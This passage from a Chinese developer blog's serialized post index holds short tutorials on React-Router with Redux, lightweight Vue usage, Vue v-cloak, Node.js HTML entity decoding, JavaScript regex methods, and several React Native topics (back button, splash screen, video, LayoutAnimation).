Latest, Category, Search, Main&#125; from './comp';export default (porps) =&gt; ( &lt;Router&gt; &lt;section&gt; &lt;Banner /&gt; &lt;Main&gt; &lt;Redirect path='/' to=\"/latest\" /&gt; &lt;Route path='/latest' component=&#123;Latest&#125; /&gt; &lt;Route path='/category' component=&#123;Category&#125; /&gt; &lt;Route path='/search' component=&#123;Search&#125; /&gt; &lt;/Main&gt; &lt;/section&gt; &lt;/Router&gt;); 连接 Redux连接 Redux 要做几样事情。 把&lt;Router&gt;嵌套在&lt;Provider&gt;里 编写reducer, action 创建Store 使用connent连接组件 把&lt;Router&gt;嵌套在&lt;Provider&gt;里Store 来自于后面创建的 Store 1234567891011121314&lt;Provider store=&#123;Store&#125;&gt; &lt;Router&gt; &lt;section&gt; &lt;Banner /&gt; &lt;Main&gt; &lt;Redirect path='/' to=\"/latest\" /&gt; &lt;Route path='/latest' component=&#123;Latest&#125; /&gt; &lt;Route path='/category' component=&#123;Category&#125; /&gt; &lt;Route path='/search' component=&#123;Search&#125; /&gt; &lt;/Main&gt; &lt;/section&gt; &lt;/Router&gt;&lt;/Provider&gt; 编写reducer, action这里只是做简单的演示： reducer.js 123456789101112131415161718192021// 初始值const initialLatest = &#123; page: 0, source: 1,&#125;;export default (state = initialLatest, action) =&gt; &#123; switch (action.type) &#123; case 'initAsync': &#123; return &#123; ...state, source: action.data, page: action.page, &#125;; &#125; default: &#123; return state; &#125; &#125;&#125; action.js 123456789101112import Api from '../../server/api';// 异步 action, 需要使用 react-thunkexport const initAsync = (page) =&gt; (dispatch, getState) =&gt; &#123; return Api.lastest(page).then(result =&gt; &#123; dispatch(&#123; type: 'initAsync', data: result, page: page + 1, &#125;); &#125;)&#125; 创建Store创建 Store 非常麻烦。 store.js 123456789101112131415161718192021222324252627282930313233343536373839404142// redux 相关import &#123; createStore, combineReducers, applyMiddleware, compose,&#125; from 'redux'// react-router-redux 相关import &#123; routerReducer, routerMiddleware,&#125; from 'react-router-redux'import createHistory from 'history/createBrowserHistory'// react-router 相关的中间件const history = createHistory();const middleware = routerMiddleware(history);// 异步中间件import thunk from 'redux-thunk';// 引用 reducersimport * as reducers from './reducers';const store = createStore( // 让每个 reducer 处理一个 store 的只节点 combineReducers(&#123; ...reducers, router: routerReducer, &#125;), // 使用中间件, 需要使用 compose 来包裹 compose( applyMiddleware(middleware, thunk), // 开启 redux devtool window.__REDUX_DEVTOOLS_EXTENSION__ &amp;&amp; window.__REDUX_DEVTOOLS_EXTENSION__() ),);export default store; 使用connent连接组件12345678910111213141516171819202122232425import React, &#123; Component &#125; from 'react';import &#123; connect &#125; from 'react-redux';import * as action from './action';class Latest extends Component &#123; constructor(props) &#123; super(props); // this.props.initAsync 来自于 action.js 中的 initAsync this.props.initAsync(0); &#125; render() &#123; return ( &lt;div&gt; &lt;p&gt;result&lt;/p&gt; &lt;/div&gt; ); &#125;&#125;// 连接 redux 中的 storeexport default connect( state =&gt; (&#123; latest: state.latest &#125;), action,)(Latest); 最后最后，成功连接后，在redux-devtool里会看到： 可以看到，在这条语句里： 1234combineReducers(&#123; ...reducers, router: routerReducer,&#125;), state.router 对应着 router: routerReducer 参考资料 https://reacttraining.com/react-router/web/guides/redux-integration https://github.com/reacttraining/react-router/tree/master/packages/react-router-redux","categories":[{"name":"React","slug":"React","permalink":"http://me.lizhooh.com/categories/React/"}],"tags":[{"name":"React","slug":"React","permalink":"http://me.lizhooh.com/tags/React/"},{"name":"学习笔记","slug":"学习笔记","permalink":"http://me.lizhooh.com/tags/学习笔记/"},{"name":"Redux","slug":"Redux","permalink":"http://me.lizhooh.com/tags/Redux/"},{"name":"React-Router","slug":"React-Router","permalink":"http://me.lizhooh.com/tags/React-Router/"}]},{"title":"Vue 低配模式开发","slug":"Vue/Vue 低配模式开发","date":"2017-03-10T13:28:58.000Z","updated":"2021-06-15T06:10:52.900Z","comments":true,"path":"/stories/2017/03/Vue/Vue 低配模式开发/","link":"","permalink":"http://me.lizhooh.com/stories/2017/03/Vue/Vue 低配模式开发/","excerpt":"前言Vue 低配模式开发，实际上是为了解决，又想使用 MVVM，因为一些历史原因，又不能完全的使用单页面应用开发模式，这时候使用 Vue 的低配模式，可以避免单纯的 JQuery 开发。","text":"前言Vue 低配模式开发，实际上是为了解决，又想使用 MVVM，因为一些历史原因，又不能完全的使用单页面应用开发模式，这时候使用 Vue 的低配模式，可以避免单纯的 JQuery 开发。 引入文件主要是引入 Babel，Vue。 12345678&lt;script crossorigin=\"anonymous\" integrity=\"sha384-Ui1pvNxCzO7LqnfgsWJ2ndsgpJPrWVTg7DCIag+do29np24E7Jyy6A09M3JUuLQf\" src=\"https://lib.baomitu.com/babel-polyfill/6.26.0/polyfill.min.js\"&gt;&lt;/script&gt;&lt;script crossorigin=\"anonymous\" integrity=\"sha384-VgZgZqjY9Fh+YsIGYp/Vzpbz9fdsC3TLwB4MrpOstd9QcaJdH/8aYw5vwisv8i8d\" src=\"https://lib.baomitu.com/babel-standalone/6.26.0/babel.min.js\"&gt;&lt;/script&gt;&lt;script crossorigin=\"anonymous\" integrity=\"sha384-8t+aLluUVnn5SPPG/NbeZCH6TWIvaXIm/gDbutRvtEeElzxxWaZN+G/ZIEdI/f+y\" src=\"https://lib.baomitu.com/vue/2.6.10/vue.min.js\"&gt;&lt;/script&gt;&lt;script crossorigin=\"anonymous\" integrity=\"sha384-J6qa4849blE2+poT4WnyKhv5vZF5SrPo0iEjwBvKU7imGFAV0wwj1yYfoRSJoZ+n\" src=\"https://lib.baomitu.com/jquery/3.4.1/jquery.slim.min.js\"&gt;&lt;/script&gt; 组件化低配模式也可以组件化编程。编写组件时，使用 template 来包裹组件的内容。 123456789101112&lt;div id='app'&gt; &#123;&#123; message &#125;&#125; &lt;input v-model=\"message\" /&gt; &lt;my-button @my-click=\"myClick\" /&gt;&lt;/div&gt;&lt;template id='my-button'&gt; &lt;button @click=\"onClick\"&gt; 你点了 &#123;&#123; count &#125;&#125; 次 &lt;/button&gt;&lt;/template&gt; 这样的话，写起来比较爽。 123456789101112131415161718192021222324252627282930Vue.component('my-button', &#123; template: '#my-button', props: &#123; myClick: Function, &#125;, data() &#123; return &#123; count: 0 &#125;; &#125;, methods: &#123; onClick() &#123; this.count++; // 向上触发事件 this.$emit('my-click', this.count); &#125;, &#125;,&#125;);const app = new Vue(&#123; el: '#app', data: &#123; message: 'Hello ! Vue!' &#125;, methods: &#123; myClick(count) &#123; console.log('子级传递上来的 count', count); &#125;, &#125;&#125;); 数据管理如果页面的数据比较复杂，可以考虑使用 Vuex，但是一般都不会用到的。 1&lt;script src=\"https://cdn.bootcss.com/vuex/3.1.1/vuex.min.js\"&gt;&lt;/script&gt; 这里的风景就变成了这样了。 123456789101112131415161718192021222324252627282930313233343536const Vue = window.Vue;const Vuex = window.Vuex;const store = new Vuex.Store(&#123; state: &#123; count: 1, &#125;, mutations: &#123; increment(state, num) &#123; state.count += num; &#125;, &#125;,&#125;);const myButton = Vue.component('my-button', &#123; template: '#my-button', props: &#123; myClick: Function, &#125;, computed: &#123; count: () =&gt; store.state.count, &#125;, methods: &#123; onClick() &#123; store.commit('increment', 10); &#125;, &#125;,&#125;);const app = new Vue(&#123; el: '#app', store: store, data: &#123; message: 'Hello ! Vue!' &#125;,&#125;); 使用 mapState 和 mapActions 之后就变成了这种风格了。 1234567891011121314151617181920212223242526272829303132333435363738const Vue = window.Vue;const Vuex = window.Vuex;const mapState = Vuex.mapState;const mapActions = Vuex.mapActions;const store = new Vuex.Store(&#123; state: &#123; count: 1, &#125;, mutations: &#123; increment(state, num) &#123; state.count += num; &#125;, &#125;, actions: &#123; increment(&#123; commit &#125;) &#123; commit('increment', 10); &#125;, &#125;,&#125;);const myButton = Vue.component('my-button', &#123; template: '#my-button', props: &#123; myClick: Function, &#125;, computed: mapState(['count']), methods: mapActions(['increment']),&#125;);const app = new Vue(&#123; el: '#app', store: store, data: &#123; message: 'Hello ! Vue!' &#125;,&#125;);","categories":[{"name":"Vue","slug":"Vue","permalink":"http://me.lizhooh.com/categories/Vue/"}],"tags":[{"name":"前端","slug":"前端","permalink":"http://me.lizhooh.com/tags/前端/"},{"name":"Vue","slug":"Vue","permalink":"http://me.lizhooh.com/tags/Vue/"}]},{"title":"Vue 解决闪现 {{ }} 的问题","slug":"Vue/Vue 解决闪现 {{ }} 的问题","date":"2017-03-10T13:28:58.000Z","updated":"2021-06-15T06:10:52.900Z","comments":true,"path":"/stories/2017/03/Vue/Vue 解决闪现 {{ }} 的问题/","link":"","permalink":"http://me.lizhooh.com/stories/2017/03/Vue/Vue 解决闪现 {{ }} 的问题/","excerpt":"","text":"Vue 解决闪现 双括号Vue 在加载时有可能整个框架还没加载完毕，用户就会看到 HTML 里面的 {\\{ name \\}} 这样的数据在 Angular1 中是使用 ng-bind 来解决这个问题的，同样 Vue 中也有类似的解决方案，不过不是使用绑定的方式 你只需要，在 CSS 中添加一个属性 123456/** * 防止加载闪烁出现 双括号 */[v-cloak] &#123; opacity: 0;&#125; 在 HTML 里添加 v-cloak 1&lt;div class=\"msg\" v-cloak&gt;&#123;&#123; other.msg &#125;&#125;&lt;/div&gt; Vue 会在加载完毕是自动去除 v-cloak 属性，所以不必为不能显示数据而担心。","categories":[{"name":"Vue","slug":"Vue","permalink":"http://me.lizhooh.com/categories/Vue/"}],"tags":[{"name":"前端","slug":"前端","permalink":"http://me.lizhooh.com/tags/前端/"},{"name":"Vue","slug":"Vue","permalink":"http://me.lizhooh.com/tags/Vue/"}]},{"title":"Nodejs HTML 实体编码转换","slug":"Nodejs/Nodejs HTML 实体编码转换","date":"2017-03-10T07:21:14.000Z","updated":"2021-06-15T06:10:52.836Z","comments":true,"path":"/stories/2017/03/Nodejs/Nodejs HTML 实体编码转换/","link":"","permalink":"http://me.lizhooh.com/stories/2017/03/Nodejs/Nodejs HTML 实体编码转换/","excerpt":"实体编码如果你看到的字符就行这样的Bill &amp; &amp;#039;Tarzan&amp;#039;，有很多都是&amp;#xxxxx的类型。那么这种就是 HTML 的实体编码。 比如说这几种： 结果 描述 实体名称 实体编号 &quot; quotation-mark &amp;quot; &amp;#34; &#39; apostrophe &amp;apos; &amp;#39; &amp; ampersand &amp;amp; &amp;#38; &lt; less-than &amp;lt; &amp;#60; &gt; greater-than &amp;gt; &amp;#62; 这时候无论是使用utf8转换还是使用其他转换都是没用的。","text":"实体编码如果你看到的字符就行这样的Bill &amp; &amp;#039;Tarzan&amp;#039;，有很多都是&amp;#xxxxx的类型。那么这种就是 HTML 的实体编码。 比如说这几种： 结果 描述 实体名称 实体编号 &quot; quotation-mark &amp;quot; &amp;#34; &#39; apostrophe &amp;apos; &amp;#39; &amp; ampersand &amp;amp; &amp;#38; &lt; less-than &amp;lt; &amp;#60; &gt; greater-than &amp;gt; &amp;#62; 这时候无论是使用utf8转换还是使用其他转换都是没用的。 html-entities这时候需要使用到一个库，html-entities 是专门来解决这些问题的编码转换库。 安装它： 1npm install --save html-entities 使用使用起来也非常简单。 正向解码： 123456const entities = new require('html-entities').XmlEntities;const htmlent = (new entities()).decode;const html = '&lt;a href=\"/tupian/qita/\"&gt;&amp;#x5176;&amp;#x4ED6;&amp;#x7C7B;&amp;#x522B;&lt;/a&gt;';console.log(htmlent(html));// &lt;a href=\"/tupian/qita/\"&gt;其他类别&lt;/a&gt; 反向编码： 123456const entities = new require('html-entities').XmlEntities;const htmlent = (new entities()).undecode;const html = '&lt;a href=\"/tupian/qita/\"&gt;其他类别&lt;/a&gt;';console.log(htmlent(html));// &lt;a href=\"/tupian/qita/\"&gt;&amp;#x5176;&amp;#x4ED6;&amp;#x7C7B;&amp;#x522B;&lt;/a&gt; 其他如果你想对 Url 进行编码与解码，请使用encodeURI(str); 编码 和 decodeURI(str); 解码 比如说：花 =&gt; %E8%8A%B1，%E8%8A%B1 =&gt; 花","categories":[{"name":"Nodejs","slug":"Nodejs","permalink":"http://me.lizhooh.com/categories/Nodejs/"}],"tags":[{"name":"后端","slug":"后端","permalink":"http://me.lizhooh.com/tags/后端/"},{"name":"Nodejs","slug":"Nodejs","permalink":"http://me.lizhooh.com/tags/Nodejs/"},{"name":"Javascript","slug":"Javascript","permalink":"http://me.lizhooh.com/tags/Javascript/"}]},{"title":"正则函数的理解","slug":"Javascript/正则表达式/正则函数的理解","date":"2017-03-09T12:41:16.000Z","updated":"2021-06-15T06:10:52.825Z","comments":true,"path":"/stories/2017/03/Javascript/正则表达式/正则函数的理解/","link":"","permalink":"http://me.lizhooh.com/stories/2017/03/Javascript/正则表达式/正则函数的理解/","excerpt":"正则函数Javascript 中与正则表达式有关的匹配字符串的函数主要有：RegExp 类的方法 exec(string) 以及 String 类的方法 match(regex)。 它们还是比较有区别的，在不同的场景有着不同的应用。","text":"正则函数Javascript 中与正则表达式有关的匹配字符串的函数主要有：RegExp 类的方法 exec(string) 以及 String 类的方法 match(regex)。 它们还是比较有区别的，在不同的场景有着不同的应用。 execexec 是一个 RegExp 类的一个方法。 先看一些例子： 12345678/\\d&#123;4&#125;-\\d&#123;2&#125;-\\d&#123;2&#125;/.exec('2017-02-15');// [\"2017-02-15\"]/\\d&#123;4&#125;-\\d&#123;2&#125;-\\d&#123;2&#125;/.exec('2017-02-15, 2017-03-16');// [\"2017-02-15\"]/\\d&#123;4&#125;-\\d&#123;2&#125;-\\d&#123;2&#125;/g.exec('2017-02-15, 2017-03-16');// [\"2017-02-15\"] 可以看出 exec 中使用 g 是没有效果的，exec 一直都只匹配第一个。 再来一些例子： 12345/(\\d&#123;4&#125;)-(\\d&#123;2&#125;)-(\\d&#123;2&#125;)/.exec('2017-02-15, 2017-03-16');// [\"2017-02-15\", \"2017\", \"02\", \"15\"]/(\\d&#123;4&#125;)-(\\d&#123;2&#125;)-(\\d&#123;2&#125;)/g.exec('2017-02-15, 2017-03-16');// [\"2017-02-15\", \"2017\", \"02\", \"15\"] 可以看出，分组对 exec 来说是有效果的，exec 会按照分组依次添加到结果数组（第一项是匹配的结果项，后面的都是分组项）。如果没有匹配结果后返回 null，而不是 []。 matchmatch(regex) 是 String 类的一个方法。 先看一些例子： 12345678'2017-02-15'.match(/\\d&#123;4&#125;-\\d&#123;2&#125;-\\d&#123;2&#125;/);// [\"2017-02-15\"]'2017-02-15, 2017-03-16'.match(/\\d&#123;4&#125;-\\d&#123;2&#125;-\\d&#123;2&#125;/);// [\"2017-02-15\"]'2017-02-15, 2017-03-16'.match(/\\d&#123;4&#125;-\\d&#123;2&#125;-\\d&#123;2&#125;/g);// [\"2017-02-15\", \"2017-03-16\"] 可以看出 match 中使用 g 是有效果的，match 会按照匹配的结果依次添加到结果数组里。 再来看一些例子： 12345678'2017-02-15'.match(/(\\d&#123;4&#125;)-(\\d&#123;2&#125;)-(\\d&#123;2&#125;)/);// [\"2017-02-15\", \"2017\", \"02\", \"15\"]'2017-02-15, 2017-03-16'.match(/(\\d&#123;4&#125;)-(\\d&#123;2&#125;)-(\\d&#123;2&#125;)/);// [\"2017-02-15\", \"2017\", \"02\", \"15\"]'2017-02-15, 2017-03-16'.match(/(\\d&#123;4&#125;)-(\\d&#123;2&#125;)-(\\d&#123;2&#125;)/g)// [\"2017-02-15\", \"2017-03-16\"] 可以看出，在不加 g 的情况，match 与 exec 一样对分组有效。而添加了 g 时，match 对分组无效。 总结exec 只会匹配第一个结果，g 对其无效。match 能够匹配多个结果集，g 对其有效。","categories":[{"name":"Javascript","slug":"Javascript","permalink":"http://me.lizhooh.com/categories/Javascript/"}],"tags":[{"name":"Javascript","slug":"Javascript","permalink":"http://me.lizhooh.com/tags/Javascript/"},{"name":"正则表达式","slug":"正则表达式","permalink":"http://me.lizhooh.com/tags/正则表达式/"}]},{"title":"React Native 导航回退","slug":"React Native/Router/React Native 导航回退","date":"2017-03-08T11:31:30.000Z","updated":"2021-06-15T06:10:52.867Z","comments":true,"path":"/stories/2017/03/React Native/Router/React Native 导航回退/","link":"","permalink":"http://me.lizhooh.com/stories/2017/03/React Native/Router/React Native 导航回退/","excerpt":"BackAndroid如果需要这样的功能，点击回退键，导航进行回退，当打开 drawer 时，进行关闭 drawer，当没有导航时，关闭程序。 BackAndroid: 监听硬件的 back 键操作。如果没有任何监听函数，或者监听函数的返回值不是 true，则会调用默认的 back 键功能来退出应用。通过监听 BackAndroid 的 hardwareBackPress 事件来实现。","text":"BackAndroid如果需要这样的功能，点击回退键，导航进行回退，当打开 drawer 时，进行关闭 drawer，当没有导航时，关闭程序。 BackAndroid: 监听硬件的 back 键操作。如果没有任何监听函数，或者监听函数的返回值不是 true，则会调用默认的 back 键功能来退出应用。通过监听 BackAndroid 的 hardwareBackPress 事件来实现。 实现 在 drawer 上监听事件： 12onDrawerOpen=&#123;_ =&gt; this._drawer.state.open = true&#125;onDrawerClose=&#123;_ =&gt; this._drawer.state.open = false&#125; 在 声明周期里添加 BackAndroid 事件： 12345678910111213141516171819202122232425262728293031onBackAndroid = (event) =&gt; &#123; // 关闭 drawer if(this._drawer.state.open) &#123; this._drawer.closeDrawer(); return true; &#125; // 导航回退 if (this.props.navigator &amp;&amp; this.props.navigator.getCurrentRoutes().length &gt; 1) &#123; this.props.navigator.pop(); return true; &#125; // 一秒内按两次，退出程序 if (this._lastBackPressed &amp;&amp; this._lastBackPressed + 1000 &gt;= Date.now()) &#123; return false; &#125; this._lastBackPressed = Date.now(); ToastAndroid.show('再按一次退出应用', ToastAndroid.SHORT); return true;&#125;;componentWillMount() &#123; BackAndroid.addEventListener('hardwareBackPress', this.onBackAndroid);&#125;componentWillUnmount() &#123; BackAndroid.removeEventListener('hardwareBackPress', this.onBackAndroid);&#125; exitApp()exitApp() 是 BackAndroid 的静态方法，用直接退出应用程序。 在退出程序之前，还可以做一些保存数据的操作。 比如： 1234onBackAndroid = async () =&gt;&#123; await saveData(); BackAndroid.exitApp();&#125; 决定作何动作根据当前界面决定作何动作。有时候我们有这样的需求：当用户处于某些界面下时，back 键要做特殊的动作。如：提示用户是否要保存数据，或者解锁界面禁止 back 键返回等等。此时，最佳实践是在 route 或 route 中对应的 Component 上保存关于如何处理 back 键的信息： 123456789101112131415161718192021222324onBackAndroid = () =&gt; &#123; const nav = this.navigator; const routers = nav.getCurrentRoutes(); if (routers.length &gt; 1) &#123; // 栈顶对象 const top = routers[routers.length - 1]; if (top.ignoreBack || top.component.ignoreBack)&#123; // 路由或组件上决定这个界面忽略back键 return true; &#125; const handleBack = top.handleBack || top.component.handleBack; if (handleBack) &#123; // 路由或组件上决定这个界面自行处理back键 return handleBack(); &#125; // 默认行为： 退出当前界面。 nav.pop(); return true; &#125; return false;&#125;;","categories":[{"name":"React Native","slug":"React-Native","permalink":"http://me.lizhooh.com/categories/React-Native/"}],"tags":[{"name":"Javascript","slug":"Javascript","permalink":"http://me.lizhooh.com/tags/Javascript/"},{"name":"学习笔记","slug":"学习笔记","permalink":"http://me.lizhooh.com/tags/学习笔记/"},{"name":"移动开发","slug":"移动开发","permalink":"http://me.lizhooh.com/tags/移动开发/"},{"name":"React-Native","slug":"React-Native","permalink":"http://me.lizhooh.com/tags/React-Native/"}]},{"title":"React Native Android 配置启动图","slug":"React Native/React Native Android 配置启动图","date":"2017-03-07T09:07:29.000Z","updated":"2021-06-15T06:10:52.859Z","comments":true,"path":"/stories/2017/03/React Native/React Native Android 配置启动图/","link":"","permalink":"http://me.lizhooh.com/stories/2017/03/React Native/React Native Android 配置启动图/","excerpt":"","text":"AndraidAndroid App 一般在启动的时候会出现白屏、黑屏，持续 0.5s - 3s （看 App 启动加载复杂度 与 手机性能）。 其主要的原因是默认的 Andraid App 是没有设置启动图的。 在启动的时候，Andraid App 需要加载各种资源，包括创建Activity等。 如果第一个Activity，还没创建完成，就会看到白屏、黑屏，一般解决这个问题就是为 Andraid App 设置一个启动图。就像淘宝 App 那样，启动的时候会看到一张关于淘宝的图片。 而 IOS App 默认设置了启动图，就不会像 Android App 那样出现白屏、黑屏。 React Native在 React Native 上同样面临着一个问题：ReactNative安卓首屏白。 网上也有不少的文章解决这个问题： ReactNative安卓首屏白屏优化 但是无论如何优化，都做不到淘宝 App 那个瞬间启动的效果。最后给 App 设置了启动图片后，一切都明亮了。 配置启动图首先在 android/app/src/main/res/drawable-hdpi 里加上一个图片作为程序启动图 (名称随意，例如：bg.png)然后修改 android/app/src/main/res/values/styles.xml 1234&lt;style name=\"AppTheme\" parent=\"Theme.AppCompat.Light.NoActionBar\"&gt; &lt;!-- 这里将刚刚那张图片设置为背景图片， bg对应图片名称 --&gt; &lt;item name=\"android:windowBackground\"&gt;@drawable/bg&lt;/item&gt;&lt;/style&gt; 最后修改我们的 react-native 顶层的容器，将它覆盖整个窗口 123456const styles = StyleSheet.create(&#123; container: &#123; flex: 1, backgroundColor: '#FFF' //背景颜色不能设置为透明 &#125;&#125;) ok, 到这一步， 启动应用看看，会发现已经没有白屏了，会有一张覆盖全屏的启动图等待。 注意： 在 安卓5.0 以上会有沉浸式状态栏闪烁的问题。原因是，react-native 默认是不设置状态栏的，所以我们需要在 MainActivity.java 中增加如下代码： 12345678910// 这里重写 createRootView 方法保证在耗时操作前完成状态栏设置@Overrideprotected ReactRootView createRootView() &#123; if (Build.VERSION.SDK_INT &gt;= Build.VERSION_CODES.KITKAT) &#123; Window window = getWindow(); // 设置为沉浸式状态栏 window.addFlags(WindowManager.LayoutParams.FLAG_TRANSLUCENT_STATUS); &#125; return super.createRootView();&#125;","categories":[{"name":"React Native","slug":"React-Native","permalink":"http://me.lizhooh.com/categories/React-Native/"}],"tags":[{"name":"Javascript","slug":"Javascript","permalink":"http://me.lizhooh.com/tags/Javascript/"},{"name":"学习笔记","slug":"学习笔记","permalink":"http://me.lizhooh.com/tags/学习笔记/"},{"name":"移动开发","slug":"移动开发","permalink":"http://me.lizhooh.com/tags/移动开发/"},{"name":"React-Native","slug":"React-Native","permalink":"http://me.lizhooh.com/tags/React-Native/"}]},{"title":"React Native Video 视频播放","slug":"React Native/Media/React Native Video 视频播放","date":"2017-03-06T14:54:30.000Z","updated":"2021-06-15T06:10:52.856Z","comments":true,"path":"/stories/2017/03/React Native/Media/React Native Video 视频播放/","link":"","permalink":"http://me.lizhooh.com/stories/2017/03/React Native/Media/React Native Video 视频播放/","excerpt":"Video如果你想要嵌入一个视频播放，那么使用react-native-video就没错了。react-native-video是一个非常优秀的视频播放组件，当然你还可以使用 HTML5 的&lt;video&gt;来解决视频播放的问题。","text":"Video如果你想要嵌入一个视频播放，那么使用react-native-video就没错了。react-native-video是一个非常优秀的视频播放组件，当然你还可以使用 HTML5 的&lt;video&gt;来解决视频播放的问题。 安装1npm install --save react-native-video 配置在配置前输入以下命令： 1react-native link react-native-video IOS 在 AppDelegate.m 里添加 12345678#import &lt;AVFoundation/AVFoundation.h&gt; // import- (BOOL)application:(UIApplication *)application didFinishLaunchingWithOptions:(NSDictionary *)launchOptions&#123; //... [[AVAudioSession sharedInstance] setCategory:AVAudioSessionCategoryAmbient error:nil]; // allow //...&#125; Android 在 android/settings.gradle 里添加 12include ':react-native-video'project(':react-native-video').projectDir = new File(rootProject.projectDir, '../node_modules/react-native-video/android') 在 android/app/build.gradle 里添加 1234dependencies &#123; // ... compile project(':react-native-video') // &lt;---- add&#125; 在 MainActivity.java 里添加 12345678910import com.brentvatne.react.ReactVideoPackage; // &lt;---- add// ...@Overrideprotected List&lt;ReactPackage&gt; getPackages() &#123; return Arrays.&lt;ReactPackage&gt;asList( new MainReactPackage(), new ReactVideoPackage() // &lt;---- add );&#125; 使用使用非常简单： 123456789101112131415161718192021222324&lt;Video // require('../assets/video/turntable.mp4') source=&#123;&#123; uri: \"\" &#125;&#125; // Can be a URL or a local file. ref=&#123;(ref) =&gt; &#123; this.player = ref; // 组件引用 &#125;&#125; rate=&#123;1.0&#125; // 0是暂停，1是正常 volume=&#123;1.0&#125; // 0是静音，1是正常，2,3,4,...n 是声音放大倍数 (1+0.1*n) muted=&#123;false&#125; // 完全静音。 paused=&#123;false&#125; // 暂停播放完全。 resizeMode=\"cover\" // 填充整个屏幕的纵横比。 repeat=&#123;true&#125; // 重复播放。 playInBackground=&#123;false&#125; // 当应用程序进入后台时，音频继续播放。 playWhenInactive=&#123;false&#125; // [iOS] 视频继续播放时，控制或通知中心显示。 progressUpdateInterval=&#123;250.0&#125; // [iOS] Interval to fire onProgress (default to ~250ms) onLoadStart=&#123;this.loadStart&#125; // 当视频开始加载时回调函数。 onLoad=&#123;this.setDuration&#125; // 视频加载时回调函数。 onProgress=&#123;this.setTime&#125; // Callback every ~250ms with currentTime [每250ms调用回调函数] onEnd=&#123;this.onEnd&#125; // 回放结束时回调函数。 onError=&#123;this.videoError&#125; // 当视频无法加载时回调函数。 onBuffer=&#123;this.onBuffer&#125; // 当远程视频缓冲时回调函数。 onTimedMetadata=&#123;this.onTimedMetadata&#125; // 当视频流接收一些元数据时回调函数。 style=&#123;styles.backgroundVideo&#125; /&gt; 静态方法目前只有 2 个静态方法。 12345// 全屏播放this.player.presentFullscreenPlayer()// 设置视频播放的位置，单位秒this.player.seek(0) 全屏播放全屏播放 react-native-video 没有提供，但是 react-native-video-controls 提供了一个全屏的控制栏。 12345678// At the top where our imports are...import VideoPlayer from 'react-native-video-controls';// in the component's render() function&lt;VideoPlayer source=&#123;&#123; uri: 'https://vjs.zencdn.net/v/oceans.mp4' &#125;&#125; navigator=&#123; this.props.navigator &#125; /&gt; 不过，这种是定义好的 UI，自定义还是需要自己造轮子。 爬坑注意，不要在 Android 模拟器上测试，要在真机上测试。 在 Android AVD 4.4 上测试的时候一直报错：error(1, -2147483648) 然后，换成了 Android AVD 5.0 没有报错，而只能听到声音，没有图像。 最后，我在自己的手机 Android 4.4 上测试，声音图像什么都有了。 造成这种原因是 Android 模拟器的视频解码器的问题。 参考资料 https://github.com/react-native-community/react-native-video","categories":[{"name":"React Native","slug":"React-Native","permalink":"http://me.lizhooh.com/categories/React-Native/"}],"tags":[{"name":"Javascript","slug":"Javascript","permalink":"http://me.lizhooh.com/tags/Javascript/"},{"name":"学习笔记","slug":"学习笔记","permalink":"http://me.lizhooh.com/tags/学习笔记/"},{"name":"移动开发","slug":"移动开发","permalink":"http://me.lizhooh.com/tags/移动开发/"},{"name":"React-Native","slug":"React-Native","permalink":"http://me.lizhooh.com/tags/React-Native/"}]},{"title":"React Native 超简单的布局动画","slug":"React Native/Animated/React Native 超简单的布局动画","date":"2017-03-06T12:24:37.000Z","updated":"2021-06-15T06:10:52.853Z","comments":true,"path":"/stories/2017/03/React Native/Animated/React Native 超简单的布局动画/","link":"","permalink":"http://me.lizhooh.com/stories/2017/03/React Native/Animated/React Native 超简单的布局动画/","excerpt":"LayoutAnimationLayoutAnimation 是一个用于在下一个绘制或者布局周期 （render/layout cycle) 里处理界面中全部视图的动画的。比较精细的动画可以用Animated来控制。但是，在一些简单的界面切换、更新的时候所做的动画里再去计算开始值、结束值和插值器如何运作绝对是浪费时间。 LayoutAnimation 提供了布局动画，比如在 &lt;listview&gt; 做一些动画元素逐渐加载，那么它就派上用途了。","text":"LayoutAnimationLayoutAnimation 是一个用于在下一个绘制或者布局周期 （render/layout cycle) 里处理界面中全部视图的动画的。比较精细的动画可以用Animated来控制。但是，在一些简单的界面切换、更新的时候所做的动画里再去计算开始值、结束值和插值器如何运作绝对是浪费时间。 LayoutAnimation 提供了布局动画，比如在 &lt;listview&gt; 做一些动画元素逐渐加载，那么它就派上用途了。 下面看一个例子： 123456789101112131415161718192021222324252627282930313233343536373839export default class DemoLayoutAnimation extends Component &#123; constructor(props) &#123; super(props); this.state = &#123; width: 100, height: 100, &#125;; this._onPress = this._onPress.bind(this); &#125; componentWillMount() &#123; LayoutAnimation.spring(); &#125; _onPress() &#123; LayoutAnimation.spring(); this.setState(&#123; width: this.state.width + 20, height: this.state.height + 20 &#125;); &#125; render() &#123; return ( &lt;View style=&#123;styles.container&#125;&gt; &lt;View style=&#123;[styles.box, &#123; width: this.state.width, height: this.state.height &#125;]&#125; /&gt; &lt;TouchableOpacity onPress=&#123;this._onPress&#125;&gt; &lt;View style=&#123;styles.button&#125;&gt; &lt;Text style=&#123;styles.buttonText&#125;&gt;Press me!&lt;/Text&gt; &lt;/View&gt; &lt;/TouchableOpacity&gt; &lt;/View&gt; ); &#125;&#125;; 结果是这样的： 使用的时候也非常简单，只需要在更新State之前调用一下 LayoutAnimation.sprint() 这么一行代码。 三种动画LayoutAnimation默认的提供了三种动画： linear spring easeInEaseOut 自定义动画当然，RN 也留出了自定义的接口。你可以按照自己需要的自定义动画效果。 下面看看如何自定义： 1234567891011121314151617181920212223242526272829303132333435363738394041import //...略...const customAnim = &#123; customSpring: &#123; duration: 400, // 持续时间 create: &#123; // 发生在创建动画时 type: LayoutAnimation.Types.spring, // spring property: LayoutAnimation.Properties.scaleXY, // XY 放缩 springDamping: 0.6 // spring 阻力 &#125;, update: &#123; // 发生在更新动画时 type: LayoutAnimation.Types.spring, springDamping: 0.6 &#125; &#125;, customLinear: &#123; duration: 200, create: &#123; type: LayoutAnimation.Types.linear, property: LayoutAnimation.Properties.opacity, &#125;, update: &#123; type: LayoutAnimation.Types.easeInEaseOut &#125; &#125;&#125;;export default class DemoLayoutAnimation extends React.Component &#123; componentWillUpdate() &#123; // 使用自定义的动画效果 LayoutAnimation.configureNext(customAnim.customLinear); &#125; _onPress() &#123; this.setState(&#123; width: this.state.width + 20, height: this.state.height + 20 &#125;); &#125; //...略...&#125;; 自定义非常简单，当然限制也不少。只需要指定动画的 duration、create 和 update。另外一个本例与上例不同的地方在于 LayoutAnimation 可以只在 componentWillUpdate() 方法里指定，不需要在点击事件里指定。 参考资料 http://facebook.github.io/react-native/docs/layoutanimation.html","categories":[{"name":"React 